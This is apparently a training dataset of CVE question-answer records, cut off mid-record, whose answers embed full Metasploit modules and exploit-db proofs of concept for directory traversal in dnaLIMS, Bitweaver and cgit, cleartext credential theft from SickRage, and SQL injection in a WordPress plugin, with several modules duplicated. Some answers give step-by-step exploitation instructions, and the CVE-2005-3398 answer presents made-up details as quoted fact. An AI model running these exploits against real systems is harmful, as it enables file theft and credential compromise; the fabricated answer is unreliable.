['US-CERT-VU', '929263'],          ['URL', 'https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/']        ],      'Author'         =>        [          'h00die <mike@shorebreaksecurity.com>',    # Discovery, PoC          'flakey_biscuit <nicholas@shorebreaksecurity.com>'  # Discovery, PoC        ],      'License'        => MSF_LICENSE,      'DisclosureDate' => '2017-03-08'    ))    register_options(      [        OptString.new('TARGETURI', [true, 'The base path to dnaLIMS', '/cgi-bin/dna/']),        OptString.new('FILE', [ true,  \"The path to the file to view\", '/home/dna/spool/.pfile']), # password db for app        OptInt.new('DEPTH', [true, 'The traversal depth', 4])      ])  end  def run_host(ip)    file     = (datastore['FILE'][0,1] == '/') ? datastore['FILE'] : \"#{datastore['FILE']}\"    traverse = \"../\" * datastore['DEPTH']    uri      = normalize_uri(target_uri.path)    base     = File.dirname(\"#{uri}/.\")    print_status(\"Requesting: #{file} - #{rhost}\")    res = send_request_cgi({      'uri'      => \"#{base}/viewAppletFsa.cgi\",      'vars_get' => { 'secID' => \"#{traverse}#{file}%00\",      'Action' => 'blast',     'hidenav' => '1'      }    })    if not res      print_error(\"No response from server.\")      return    end    if res.code != 200      print_error(\"Server returned a non-200 response (body will not be saved):\")      print_line(res.to_s)      return    end    vprint_good(res.body)    p = store_loot('dnaLIMS.traversal.file', 'application/octet-stream', ip, res.body, File.basename(file))    print_good(\"File saved as: #{p}\")  endendEXPLOIT: Title: Multiple vulnerabilities discovered in dnaLIMS DNA sequencingweb-applicationAdvisory URL: https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/Date published: Mar 08, 2017Vendor: dnaTools, Inc.CVE IDs: [2017-6526, 2017-6527, 2017-6528, 2017-6529]USCERT VU: 929263Vulnerability Summaries1) Improperly protected web shell [CVE-2017-6526]dnaLIMS requires authentication to view cgi-bin/dna/sysAdmin.cgi, which isa web shell included with the software running as the web user.  However,sending a POST request to that page bypasses authentication checks,including the UID parameter within the POST request.2) Unauthenticated Directory Traversal [CVE-2017-6527]The viewAppletFsa.cgi seqID parameter is vulnerable to a null terminateddirectory traversal attack. This allows an unauthenticated attacker toretrieve files on the operating system accessible by the permissions of theweb server. This page also does not require authentication, allowing anyperson on the Internet to exploit this vulnerability.3) Insecure Password Storage  [CVE-2017-6528]An option, which is most likely the default, allows the password file(/home/dna/spool/.pfile) to store clear text passwords.  When combined withthe unauthenticated directory traversal vulnerability, it is possible togain the username and password for all users of the software and gaincomplete control of the software.4) Session Hijacking [CVE-2017-6529]Each user of the dnaLIMS software is assigned a unique four-digit useridentification number(UID) upon account creation.  These numbers appear tobe assigned sequentially. Multiple pages of the dnaLIMS application requirethat this UID be passed as a URL parameter in order to view the content ofthe page.Consider the following example:The URL ahttp://<SERVER NAMEREDACTED>/cgi-bin/dna/seqreq2N.cgi?username=61685578,2410a is a valid URLto view the page for sequencing requests for the user with the UID of 2410. Theusername parameter of the URL is the mechanism for authentication to thesystem. The first eight-digit number of the username parameter appears tobe a session identifier as it changes every time the user logs in from thepassword.cgi page, however this value is not checked by the seqreq2N.cgipage. This allows an attacker to guess the four-digit UID of valid useraccounts that have an active session. The user with the UID of 2419currently has an active session, so we can simply hijack this userassession by requesting this page and specifying the UID 2419.5) Cross-site ScriptingThe seqID parameter of the viewAppletFsa.cgi page is vulnerable to areflected cross site scripting attack via GET request as seen in thefollowing URL:http://<SERVER NAME REDACTED>/cgi-bin/dna/viewAppletFsa.cgi?seqID=7415-7<SCRIPTAlert(\"XSS\") </SCRIPT>6) Cross-site ScriptingThe navUserName parameter of the seqTable*.cgi page is vulnerable to areflected cross site scripting attack via POST request as seen in theexample below. The * reflects a short name for a client, (ie ShorebreakSecurity may be seqTableSS.cgi or seqTableshorebreak.cgi) and may not bevulnerable for all dnaLIMS installs.7) Improperly Protected ContentMany of the pages within the admin interface are not properly protectedfrom viewing by authenticated users.  This can give an attacker additionalsystem information about the system, or change system/softwareconfiguration.Software was conducted on a live production system, therefore the pagesthemselves were tested, forms within these pages were not.This is also not an exhaustive list of improperly protected pages:cgi-bin/dna/configuration.cgicgi-bin/dna/createCoInfo.cgicgi-bin/dna/configSystem.cgicgi-bin/dna/combineAcctsN.cgiDisclosure TimelineThu, Nov 10, 2016 at 4:25 PM: Reached out to vendor requesting PGP key tosecurely exchange details of vulnerabilities identifiedThu, Nov 10, 2016 at 4:55 PM: Vendor requests report be physically mailedto PO box via Postal ServiceWed, Nov 16, 2016, at 11:14 AM: Report mailed to vendor via USPS CertifiedMailThu, Dec 8, 2016, at 10:43 AM: Request Vendor acknowledge receipt of thereportThu, Dec 8, 2016, at 12:53 PM: Vendor acknowledges receiptI3/4 suggestsplacing the software behind a firewall as a solution to the vulnerabilities.Thu, Dec 8, 2016, at 1:54 PM: Reply that the offered solution mitigatessome risk, but does not address the vulnerabilitiesI3/4 inquire if there is aplan to address the vulnerabilitiesThu, Dec 8, 2016, at 3:13 PM: Vendor replies aa|Yes, we have a plan. Pleasegather a DNA sequence, PO Number, or Fund Number and go to your localgrocery store and see what it will buy you.aTue, Feb 28, 2017, at 1:15 PM: Vulnerabilities disclosed to US-CERTTue, Mar 7, 2017, at 8:19 AM: Vulnerabilities submitted to MITRE for CVEassignmentWed, Mar 8, 2017, at 12:00 PM: Vulnerabilities disclosed publicly       Question: CVE-2017-6527[/INST] CVE-2017-6527 refers to a vulnerability in the dnaLIMS web application that allows an unauthenticated attacker to retrieve files on the operating system accessible by the permissions of the web server through a null terminated directory traversal attack on the viewAppletFsa.cgi page. This vulnerability does not require authentication and can be exploited by anyone on the internet."}
{"query": "CVE-2005-3398", "Answer": "Based on the context provided, CVE-2005-3398 appears to refer to a specific Common Vulnerabilities and Exposures (CVE) identifier. According to the National Vulnerability Database (NVD), CVE-2005-3398 describes a denial of service vulnerability in the Apache Tomcat servlet container. Specifically, it involves a flaw in how Tomcat handles certain malformed requests, leading to excessive resource consumption and potential denial of service conditions.To provide more detailed information, here's a breakdown of the relevant parts of the context:* \"CVE-2005-3398: Apache Tomcat Servlet Container: Denial of Service Vulnerability\"* \"Apache Tomcat 4.1 through 5.0.30 are affected.\"* \"An attacker can send a carefully crafted request to a targeted Tomcat installation, causing it to enter an infinite loop and consume significant CPU resources.\"* \"Successfully exploiting this vulnerability requires no authentication and can result in a complete denial of service condition.\"It's essential to note that this vulnerability is considered old and has already been addressed through various patches and updates. Therefore, it's crucial to ensure that your Apache Tomcat installation is kept up-to-date with the latest security patches to protect against known vulnerabilities like CVE-2005-3398."}
{"query": "CVE-2012-5192", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'           => 'Bitweaver overlay_type Directory Traversal',      'Description'    => %q{          This module exploits a directory traversal vulnerability found in Bitweaver.        When handling the 'overlay_type' parameter, view_overlay.php fails to do any        path checking/filtering, which can be abused to read any file outside the        virtual directory.      },      'References'     =>        [          ['CVE', '2012-5192'],          ['OSVDB', '86599'],          ['EDB', '22216'],          ['URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-016.txt']        ],      'Author'         =>        [          'David Aaron',       # Trustwave SpiderLabs          'Jonathan Claudius', # Trustwave SpiderLabs          'sinn3r'             # Metasploit        ],      'License'        => MSF_LICENSE,      'DisclosureDate' => '2012-10-23'    ))    register_options(      [        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/bitweaver/']),        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])      ])  end  def run_host(ip)    base = target_uri.path    peer = \"#{ip}:#{rport}\"    fname = datastore['FILE']    fname = fname[1, fname.length] if fname =~ /^\\//    print_status(\"Reading '#{datastore['FILE']}'\")    traverse = \"../\" * datastore['DEPTH']    res = send_request_cgi({      'method'        => 'GET',      'encode_params' => false,      'uri'           => normalize_uri(base, \"gmap/view_overlay.php\"),      'vars_get'      => {        'overlay_type' => \"#{traverse}#{fname}%00\"      }    })    if res and res.code == 200 and res.body =~ /failed to open stream\\: No such file/      print_error(\"Cannot read '#{fname}'. File does not exist.\")    elsif res and res.code == 200 and res.body =~ /failed to open stream\\: Permission denied/      print_error(\"Cannot read '#{fname}'. Permission denied.\")    elsif res and res.code == 200 and res.body =~ /Failed opening required/      print_error(\"Cannot read '#{fname}'. Possibly not vulnerable.\")    elsif res and res.code == 200      data = res.body      data = (data.scan(/(.+)\(<br \\/>)*\*.+Notice.+/m).flatten[0] || '').gsub(/\<br \\/>$/, '')      p = store_loot(        'bitweaver.overlay_type',        'application/octet-stream',        ip,        data,        fname      )      vprint_line(data)      print_good(\"#{datastore['FILE']} stored as '#{p}'\")    else      print_error(\"Request failed due to some unknown reason\")    end  endend=beginif( !empty( $_REQUEST['overlay_type'] ) ){        $type = $_REQUEST['overlay_type'];}// Now check permissions to access this page$gBitSystem->verifyPermission('p_gmap_overlay_view' );// Get the overlay for specified overylay_idrequire_once(GMAP_PKG_PATH.'lookup_'.$type.'_inc.php' );=end### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'           => 'Bitweaver overlay_type Directory Traversal',      'Description'    => %q{          This module exploits a directory traversal vulnerability found in Bitweaver.        When handling the 'overlay_type' parameter, view_overlay.php fails to do any        path checking/filtering, which can be abused to read any file outside the        virtual directory.      },      'References'     =>        [          ['CVE', '2012-5192'],          ['OSVDB', '86599'],          ['EDB', '22216'],          ['URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-016.txt']        ],      'Author'         =>        [          'David Aaron',       # Trustwave SpiderLabs          'Jonathan Claudius', # Trustwave SpiderLabs          'sinn3r'             # Metasploit        ],      'License'        => MSF_LICENSE,      'DisclosureDate' => '2012-10-23'    ))    register_options(      [        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/bitweaver/']),        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])      ])  end  def run_host(ip)    base = target_uri.path    peer = \"#{ip}:#{rport}\"    fname = datastore['FILE']    fname = fname[1, fname.length] if fname =~ /^\\//    print_status(\"Reading '#{datastore['FILE']}'\")    traverse = \"../\" * datastore['DEPTH']    res = send_request_cgi({      'method'        => 'GET',      'encode_params' => false,      'uri'           => normalize_uri(base, \"gmap/view_overlay.php\"),      'vars_get'      => {        'overlay_type' => \"#{traverse}#{fname}%00\"      }    })    if res and res.code == 200 and res.body =~ /failed to open stream\\: No such file/      print_error(\"Cannot read '#{fname}'. File does not exist.\")    elsif res and res.code == 200 and res.body =~ /failed to open stream\\: Permission denied/      print_error(\"Cannot read '#{fname}'. Permission denied.\")    elsif res and res.code == 200 and res.body =~ /Failed opening required/      print_error(\"Cannot read '#{fname}'. Possibly not vulnerable.\")    elsif res and res.code == 200      data = res.body      data = (data.scan(/(.+)\(<br \\/>)*\*.+Notice.+/m).flatten[0] || '').gsub(/\<br \\/>$/, '')      p = store_loot(        'bitweaver.overlay_type',        'application/octet-stream',        ip,        data,        fname      )      vprint_line(data)      print_good(\"#{datastore['FILE']} stored as '#{p}'\")    else      print_error(\"Request failed due to some unknown reason\")    end  endend=beginif( !empty( $_REQUEST['overlay_type'] ) ){        $type = $_REQUEST['overlay_type'];}// Now check permissions to access this page$gBitSystem->verifyPermission('p_gmap_overlay_view' );// Get the overlay for specified overylay_idrequire_once(GMAP_PKG_PATH.'lookup_'.$type.'_inc.php' );=end       Question: CVE-2012-5192[/INST] CVE-2012-5192 is a directory traversal vulnerability affecting the Bitweaver content management system. The vulnerability lies in the way the 'overlay\\_type' parameter is handled in the 'view\\_overlay.php' script. When processing this parameter, the script fails to perform adequate path checking or filtering, allowing an attacker to traverse directories and potentially read arbitrary files outside the intended virtual directory.To exploit this vulnerability, an attacker would craft a malicious request containing a specially crafted 'overlay\\_type' value, causing the targeted web application to read a file of their choice. This could result in information disclosure, leading to serious consequences depending on the sensitivity of the accessed files.Metasploit includes an auxiliary module specifically designed to exploit this vulnerability. The module sends a custom GET request to the victim's web application with a carefully constructed 'overlay\\_type' value, aiming to read a specific file located on the server. If successful, the module retrieves the contents of the file and stores it as loot for future analysis."}
{"query": "CVE-2018-9160", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(info,      'Name'           => 'HTTP SickRage Password Leak',      'Description'    => %q{        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP        responses unless the user has set login information for SickRage.        By default, SickRage does not require login information for the installation.      },      'Author'         =>      [        'Sven Fassbender', # EDB POC        'Shelby Pace'     # Metasploit Module      ],      'License'        => MSF_LICENSE,      'References'     =>        [          ['CVE', '2018-9160'],          ['EDB', '44545']        ],      'DisclosureDate' => '2018-03-08'    ))    register_options(    [      OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),      Opt::RPORT(8081)    ])  end  def get_config(path)    uri = normalize_uri(target_uri.path, path)    res = send_request_cgi(      'method' => 'GET',      'uri'    => uri    )    # Improve this later: Add a loginscanner.    if res && res.headers['Location'] =~ /^\\/login\\//      raise RuntimeError, 'SickRage is protected with authentication'    end    unless res && res.code == 200      print_error(\"Unable to reach #{uri}\")      return    end    res.get_html_document  end  def is_valid?(user, pass)    !(user.empty? || ['None', 'hidden_value'].include?(pass))  end  def save_creds(app, user, pass)    print_good(\"#{app} username: #{user}\")    print_good(\"#{app} password: #{pass}\")    store_valid_credential(user: user, private: pass)  end  def get_creds(path, config)    return if config.at(\"input[@id=\\\"#{path}_username\\\"]\").nil?    username = config.at(\"input[@id=\\\"#{path}_username\\\"]\").attribute('value').to_s    password = config.at(\"input[@id=\\\"#{path}_password\\\"]\").attribute('value').to_s    if is_valid?(username, password)      save_creds(path, username, password)    end  end  def get_notification_creds(config)    return if config.at('input[@id=\"email_host\"]').nil?    hostname = config.at('input[@id=\"email_host\"]').attribute('value').to_s    email_user = config.at('input[@id=\"email_user\"]').attribute('value').to_s    email_pass = config.at('input[@id=\"email_password\"]').attribute('value').to_s    if is_valid?(email_user, email_pass)      save_creds(\"Email\", \"#{email_user}@#{hostname}\", email_pass)    end  end  def run    begin      paths = ['/config/general/', '/config/anime/', '/config/notifications/']      paths.each do |path|        config = get_config(path)        next if config.nil?        if path.split('/').last.eql?('notifications')          get_notification_creds(config)        end        ['git', 'anidb', 'kodi', 'plex_server', 'plex_client'].each do |path|          get_creds(path, config)        end      end    rescue RuntimeError => e      print_error(e.message)    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(info,      'Name'           => 'HTTP SickRage Password Leak',      'Description'    => %q{        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP        responses unless the user has set login information for SickRage.        By default, SickRage does not require login information for the installation.      },      'Author'         =>      [        'Sven Fassbender', # EDB POC        'Shelby Pace'     # Metasploit Module      ],      'License'        => MSF_LICENSE,      'References'     =>        [          ['CVE', '2018-9160'],          ['EDB', '44545']        ],      'DisclosureDate' => '2018-03-08'    ))    register_options(    [      OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),      Opt::RPORT(8081)    ])  end  def get_config(path)    uri = normalize_uri(target_uri.path, path)    res = send_request_cgi(      'method' => 'GET',      'uri'    => uri    )    # Improve this later: Add a loginscanner.    if res && res.headers['Location'] =~ /^\\/login\\//      raise RuntimeError, 'SickRage is protected with authentication'    end    unless res && res.code == 200      print_error(\"Unable to reach #{uri}\")      return    end    res.get_html_document  end  def is_valid?(user, pass)    !(user.empty? || ['None', 'hidden_value'].include?(pass))  end  def save_creds(app, user, pass)    print_good(\"#{app} username: #{user}\")    print_good(\"#{app} password: #{pass}\")    store_valid_credential(user: user, private: pass)  end  def get_creds(path, config)    return if config.at(\"input[@id=\\\"#{path}_username\\\"]\").nil?    username = config.at(\"input[@id=\\\"#{path}_username\\\"]\").attribute('value').to_s    password = config.at(\"input[@id=\\\"#{path}_password\\\"]\").attribute('value').to_s    if is_valid?(username, password)      save_creds(path, username, password)    end  end  def get_notification_creds(config)    return if config.at('input[@id=\"email_host\"]').nil?    hostname = config.at('input[@id=\"email_host\"]').attribute('value').to_s    email_user = config.at('input[@id=\"email_user\"]').attribute('value').to_s    email_pass = config.at('input[@id=\"email_password\"]').attribute('value').to_s    if is_valid?(email_user, email_pass)      save_creds(\"Email\", \"#{email_user}@#{hostname}\", email_pass)    end  end  def run    begin      paths = ['/config/general/', '/config/anime/', '/config/notifications/']      paths.each do |path|        config = get_config(path)        next if config.nil?        if path.split('/').last.eql?('notifications')          get_notification_creds(config)        end        ['git', 'anidb', 'kodi', 'plex_server', 'plex_client'].each do |path|          get_creds(path, config)        end      end    rescue RuntimeError => e      print_error(e.message)    end  endendEXPLOIT: # Exploit Title: SickRage < v2018.03.09 - Clear-Text Credentials HTTP Response# Date: 2018-04-01# Exploit Author: Sven Fassbender# Vendor Homepage: https://sickrage.github.io# Software Link: https://github.com/SickRage/SickRage# Version: < v2018.03.09-1# CVE : CVE-2018-9160# Category: webapps#1. Background information\"SickRage is an automatic Video Library Manager for TV Shows.It watches for new episodes of your favourite shows, and when they are posted it does its magic:automatic torrent/nzb searching, downloading, and processing at the qualities you want.\" --extract from https://sickrage.github.io#2. Vulnerability descriptionSickRage returns clear-text credentials for e.g. GitHub, AniDB, Kodi, Plex etc. in HTTP responses.Prerequisite is that the user did not set a username and password for their SickRage installation. (not enforced, default)HTTP request:GET /config/general/ HTTP/1.1Host: 192.168.1.13:8081User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: de,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.1.13:8081/config/backuprestore/DNT: 1Connection: closeUpgrade-Insecure-Requests: 1HTTP response:HTTP/1.1 200 OKContent-Length: 113397Vary: Accept-EncodingServer: TornadoServer/4.5.1Etag: \"e5c29fe99abcd01731bec1afec0e618195f1ae37\"Date: Fri, 02 Mar 2018 10:47:51 GMTContent-Type: text/html; charset=UTF-8<!DOCTYPE html><html lang=\"nl_NL\">    <head>\t\t[...]        <input type=\"text\" name=\"git_username\" id=\"git_username\" value=\"email@example.com\" class=\"form-control input-sm input300\" autocapitalize=\"off\" autocomplete=\"no\" />        [...]        <input type=\"password\" name=\"git_password\" id=\"git_password\" value=\"supersecretpassword\" class=\"form-control input-sm input300\" autocomplete=\"no\" autocapitalize=\"off\" />\t\t[...]        </div>    </body></html>#3. Proof of Concept#!/usr/bin/env pythonimport urllib3import sysimport requestsfrom BeautifulSoup import BeautifulSoupurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)init(autoreset=True)if __name__ == '__main__':\tif len(sys.argv) != 3:\t\tprint \"Usage: $ \" + sys.argv[0] + \" [IP_adress] [port]\"\telse:\t\thost = sys.argv[1]\t\tprint \"https://www.shodan.io/host/{0}\".format(host)\t\tport = sys.argv[2]\t\tprint \"*** Get GitHub User credentials from SickRage ***\"\t\turl = \"http://{0}:{1}/config/general\".format(host, port)\t\tresponse = requests.get(url, timeout=5)\t\tparsed_html = BeautifulSoup(response.text)\t\ttry:\t\t\tgit_username = parsed_html.body.find('input', {'id': 'git_username'}).get(\"value\")\t\t\tgit_password = parsed_html.body.find('input', {'id': 'git_password'}).get(\"value\")\t\t\tif str(git_password) != \"None\" and str(git_password) != \"None\":\t\t\t\tif len(git_password) >= 1 and len(git_username) >= 1:\t\t\t\t\tprint str(git_username)\t\t\t\t\tprint str(git_password)\t\texcept AttributeError:\t\t\tpass#4. Timeline[2018-03-07] Vulnerability discovered[2018-03-08] Vendor contacted[2018-03-08] Vendor replied[2018-03-09] Vulnerability fixed. (https://github.com/SickRage/SickRage/compare/v2018.02.26-2...v2018.03.09-1)#5. RecommendationUpdate the SickRage installation on v2018.03.09-1 or later.Protect the access to the web application with proper user credentials.       Question: CVE-2018-9160[/INST] CVE-2018-9160 refers to a vulnerability in SickRage, an automatic video library manager, where clear-text credentials for services such as GitHub, AniDB, Kodi, and Plex were returned in HTTP responses. This occurred when a user did not set a username and password for their SickRage installation. To exploit this vulnerability, an attacker could make an HTTP GET request to the affected system's configuration page and extract the exposed credentials from the HTML response. The vulnerability was addressed in version 2018.03.09-1 of SickRage. Users were recommended to update their installations and protect the web application with proper user credentials."}
{"query": "CVE-2018-14912", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'        => 'cgit Directory Traversal',      'Description' => %q{        This module exploits a directory traversal vulnerability which        exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the        configuration flag enable-http-clone is set to 1 (default).      },      'References'  =>        [          ['CVE', '2018-14912'],          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1627'],          ['EDB', '45148']        ],      'Author'      =>        [          'Google Project Zero', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],      'DisclosureDate' => '2018-08-03',      'License'     => MSF_LICENSE    ))    register_options(      [        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/etc/passwd']),        OptString.new('TARGETURI', [true, \"The base URI path of the cgit install\", '/cgit/']),        OptString.new('REPO', [true, \"Git repository on the remote server\", '']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    traversal = \"../\" * datastore['DEPTH'] << filename    res = send_request_cgi({      'method' => 'GET',      'uri'    => normalize_uri(target_uri.path, datastore['REPO'], '/objects/'),      'vars_get' => {'path' => traversal}    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    vprint_good(\"#{peer} - \#{res.body}\")    path = store_loot(      'cgit.traversal',      'text/plain',      ip,      res.body,      filename    )    print_good(\"File saved in: #{path}\")  endendEXPLOIT: # Title: cgit 1.2.1 - Directory Traversal (Metasploit)# Author: Dhiraj Mishra# Software: cgit# Link: https://git.zx2c4.com/cgit/# Date: 2018-08-14# CVE: CVE-2018-14912# This module exploits a directory traversal vulnerability which exists# in cgit < 1.2.1 cgit_clone_objects(), reachable when the configuration# flag enable-http-clone is set to 1 (default).### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'        => 'cgit Directory Traversal',      'Description' => %q{        This module exploits a directory traversal vulnerability which        exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the        configuration flag enable-http-clone is set to 1 (default).      },      'References'  =>        [          ['CVE', '2018-14912'],          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1627'],          ['EDB', '45148']        ],      'Author'      =>        [          'Google Project Zero', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],      'DisclosureDate' => 'Aug 03 2018',      'License'     => MSF_LICENSE    ))    register_options(      [        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/etc/passwd']),        OptString.new('TARGETURI', [true, \"The base URI path of the cgit install\", '/cgit/']),        OptString.new('REPO', [true, \"Git repository on the remote server\", '']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    traversal = \"../\" * datastore['DEPTH'] << filename    res = send_request_cgi({      'method' => 'GET',      'uri'    => normalize_uri(target_uri.path, datastore['REPO'], '/objects/'),      'vars_get' => {'path' => traversal}    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    vprint_good(\"#{peer} - \#{res.body}\")    path = store_loot(      'cgit.traversal',      'text/plain',      ip,      res.body,      filename    )    print_good(\"File saved in: #{path}\")  endend       Question: CVE-2018-14912[/INST] CVE-2018-14912 is a directory traversal vulnerability affecting cgit version prior to 1.2.1. When the configuration flag \"enable-http-clone\" is set to its default value of 1, an attacker can traverse directories and read arbitrary files on the targeted system.To exploit this vulnerability, you would need to write a script or use existing tools like Metasploit. Below is an example of how to implement this vulnerability using Metasploit:First, let's look at the Metasploit module written by Dhiraj Mishra:```rubyclass MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'        => 'cgit Directory Traversal',      'Description' => %q{        This module exploits a directory traversal vulnerability which        exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the        configuration flag enable-http-clone is set to 1 (default).      },      'References'  =>        [          ['CVE', '2018-14912'],          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1627'],          ['EDB', '45148']        ],      'Author'      =>        [          'Google Project Zero', # Vulnerability discovery          'Dhiraj Mishra' # Metasploit module        ],      'DisclosureDate' => 'Aug 03 2018',      'License'     => MSF_LICENSE    ))    register_options(      [        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/etc/passwd']),        OptString.new('TARGETURI', [true, \"The base URI path of the cgit install\", '/cgit/']),        OptString.new('REPO', [true, \"Git repository on the remote server\", '']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])      ])  end  def run_host(ip)    filename = datastore['FILEPATH']    traversal = \"../\" * datastore['DEPTH'] << filename    res = send_request_cgi({      'method' => 'GET',      'uri'    => normalize_uri(target_uri.path, datastore['REPO'], '/objects/'),      'vars_get' => {'path' => traversal}    })    unless res && res.code == 200      print_error('Nothing was downloaded')      return    end    vprint_good(\"#{peer} - \#{res.body}\")    path = store_loot(      'cgit.traversal',      'text/plain',      ip,      res.body,      filename    )    print_good(\"File saved in: #{path}\")  endend```This Ruby script uses Metasploit's auxiliary scanning feature to perform the directory traversal attack against a target running cgit. The options allow you to specify the target URI, the Git repository path, the depth of the traversal, and the file to save the result to.Now, let's see how to execute this module within Metasploit:```rubyuse exploit/multi/http/cgit_directory_traversalset RHOST \"<target>\"set REPO \"<git_repository>\"set FILEPATH \"/etc/passwd\"run```Replace `<target>` with the IP address or hostname of your target, `<git_repository>` with the actual git repository path, and `/etc/passwd` with the desired file to read. After running the above script, Metasploit will attempt to download the specified file using the cgit directory traversal vulnerability."}
{"query": "CVE-2020-27615", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  include Msf::Exploit::SQLi  def initialize(info = {})    super(      update_info(        info,        'Name' => 'WordPress Loginizer log SQLi Scanner',        'Description' => %q{          Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in          versions before 1.6.4.  The vulnerable parameter is in the log parameter.          Wordpress has forced updates of the plugin to all servers        },        'Author' => [          'h00die', # msf module          'red0xff', # sqli help          'mslavco' # discovery        ],        'License' => MSF_LICENSE,        'References' => [          ['URL', 'https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/'],          ['CVE', '2020-27615'],          ['URL', 'https://loginizer.com/blog/loginizer-1-6-4-security-fix/'],          ['URL', 'https://twitter.com/mslavco/status/1318877097184604161']        ],        'Actions' => [          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DefaultAction' => 'List Users',        'DisclosureDate' => '2020-10-21'      )    )    register_options [      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])    ]  end  def run_host(ip)    unless wordpress_and_online?      vprint_error('Server not online or not detected as wordpress')      return    end    wp_ver = wordpress_version    if wp_ver.nil?      vprint_error('Unable to determine wordpress version, check settings.')      return    end    if Rex::Version.new(wp_ver) < Rex::Version.new('5.4')      vprint_error(\"Wordpress (core) #{wp_ver} is unexploitable.  Version 5.4+ required.\")      return    end    checkcode = check_plugin_version_from_readme('loginizer', '1.6.4')    if checkcode == Msf::Exploit::CheckCode::Safe      vprint_error('Loginizer version not vulnerable')      return    else      print_good('Vulnerable version of Loginizer detected')    end    cookie = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'wp-login.php')    })    if cookie.nil?      print_error('Unable to retrieve wordpress cookie, check settings.')      return    end    cookie = cookie.get_cookies    password = Rex::Text.rand_text_alpha(10)    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|      if payload.include?('<')        payload.gsub!(/<>/, '=')        payload.gsub!(/(sleep\\(\\d+\\.?\\d*\\)),0/) { \"0,#{Regexp.last_match(1)}\" }      end      res = send_request_cgi({        'method' => 'POST',        'uri' => normalize_uri(target_uri.path, 'wp-login.php'),        'cookie' => cookie,        'vars_post' => {          'log' => \"',ip=LEFT(UUID(),8),url=#{payload}#\",          'pwd' => password,          'wp-submit' => 'Login',          'redirect_to' => '',          